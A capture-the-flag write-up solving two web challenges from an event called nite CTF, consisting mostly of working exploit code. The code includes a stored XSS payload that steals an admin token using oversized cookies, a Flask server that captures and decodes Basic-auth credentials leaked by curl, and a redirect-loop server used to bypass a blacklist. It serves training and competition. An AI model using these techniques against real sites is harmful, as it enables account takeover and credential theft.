## Just Another Notes App
> flag: nite{r3qu3575_d0n7_n33d_70_4lw4y5_c0mpl373}

### Solution:
- The challenge was to use vulnerability of 431 status code and exploit it to leak the token
- Following [article](https://castilho.sh/scream-until-escalates) goes into more detail on this
- Basically when header exceeds the limit set by server, it give 431 status code
- According to the article, the size of Gunicorn is 8185
<img width="1445" height="168" alt="image" src="https://github.com/user-attachments/assets/45807771-f164-4252-a4e3-b12d33c31e46" />

- If we set the size of request with just about right size of cookie then as soon as finaltoken is inserted, the request will redirect to url with the token in query parameter
- As token size exceeds the size set by server, the request will fail and give 431 error, causing the token to leak to javascript
- Webhook didn't work for this, so the other way to do this was making the admin bot post the token as note using our own session cookie and then access it on our account
- Then we can change our perms to admin and get the flag
- Thus we can use this python script:
```
import requests
import json
from bs4 import BeautifulSoup

# Create a session to persist cookies
s = requests.Session()

# register user
s.post("https://notes.chals.nitectf25.live/register", data={"username":"arunlikeskidsab","password":"attackerpass"})

# login
r = s.post("https://notes.chals.nitectf25.live/login", data={"username":"arunlikeskidsab","password":"attackerpass"})
print("Login status:", r.status_code)
print("All cookies:", s.cookies.get_dict())

# Extract the session cookie value
session_cookie = s.cookies.get("session")
print("Extracted session cookie:", session_cookie)

# add note with XSS payload
xss_payload = """<script>
(async () => {
    // fetch invite
    const gen = await fetch("https://notes.chals.nitectf25.live/admin/generate_invite", { method: "POST" });
    console.log(gen);

    document.cookie = "x="+"A".repeat(4095);
    document.cookie = "y="+"B".repeat(3991);

    // fetch redirect
    const e = await fetch("https://notes.chals.nitectf25.live/getToken", { credentials: "include" });
    console.log(e);

    // e.url now contains the redirected URL with token
    const url = new URL(e.url);
    const t = url.searchParams.get("token");
    console.log("Token:", t);

    document.cookie = "x="+"A";
    document.cookie = "y="+"B";
    document.cookie = "session={session}";
    
    // send the note and get response
    const noteResponse = await fetch("https://notes.chals.nitectf25.live/notes", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "content=" + encodeURIComponent(t)
    });
    
})();
</script>"""

# Replace the placeholder with the actual session cookie value
xss_payload = xss_payload.replace("{session}", session_cookie)

print("\nPayload preview:", xss_payload[:200])

# Post to notes — cookies are persisted in the session
r = s.post("https://notes.chals.nitectf25.live//notes", data={"content":xss_payload})
print("Note posted, status:", r.status_code)

# Get notes — cookies still persisted
r = s.get("https://notes.chals.nitectf25.live//notes")
soup = BeautifulSoup(r.text, 'html.parser')
note_link = soup.find('div').find('a')['href']
print("Note link:", note_link)

print("XSS payload injected, submit url to admin bot")
```
---

## Single Sign Off
> flag: nite{r3dir3ct_l3ak_r3p3at}

### Solution:
- If we check the dockerfile, we can see it uses curl `7.80.0`, which is vulnerable to [CVE-2025-0167](https://curl.se/docs/CVE-2025-0167.html)
- So basically when `.netrc` file contains empty default entries, it allows the credentials to be leaked via a redirect
- To get access to `nite-vault`, we must find the credentials from `nite-sso` in `.netrc` file
- `nite-sso` has `doLogin` endpoint which allows for open redirects
- So we can use a python script to automate this and also send a 401 request to attatch credentials:
```
from flask import Flask, request
import base64

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def capture_all(path):

    auth = request.headers.get('Authorization')
    
    if auth and auth.startswith('Basic '):
        try:
            encoded = auth.split(' ')[1]
            decoded = base64.b64decode(encoded).decode('utf-8')
            
            print(f"credentials: {decoded}")
            
            return f"credentials: {decoded}\n", 200
            
        except Exception as e:
            return "Error decoding credentials", 400
    else:  
        return "getting creds", 401, {
            'WWW-Authenticate': 'Basic realm="Credential Capture"'
        }


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=False)
```
- We still cannot access `nite-vault` due to blacklist
- `CURLE_TOO_MANY_REDIRECTS` is vulnerable and doesn't check for final redirect after limit is reached
- We can create a loop using python script to access this:
```
from flask import Flask, redirect, request
import sys

app = Flask(__name__)

REDIRECT_COUNT = 0
MAX_REDIRECTS = 6
TARGET = "http://nite-vault/view?file=/proc/self/status&username=fakeuser&password=fakepassword"  

@app.route('/')
def redirector():
    global REDIRECT_COUNT
    REDIRECT_COUNT += 1

    host = request.host
    scheme = request.scheme
    
    if REDIRECT_COUNT < MAX_REDIRECTS:
        return redirect(f"{scheme}://{host}/", code=302)
    else:
        REDIRECT_COUNT = 0
        return redirect(TARGET, code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(sys.argv[1]) if len(sys.argv) > 1 else 5001)
```
- `/proc/self/status` contains `pid`, `uid` and `gid`, the file name of flag is generated from PRNG with seed values containing formarlly mentioned values

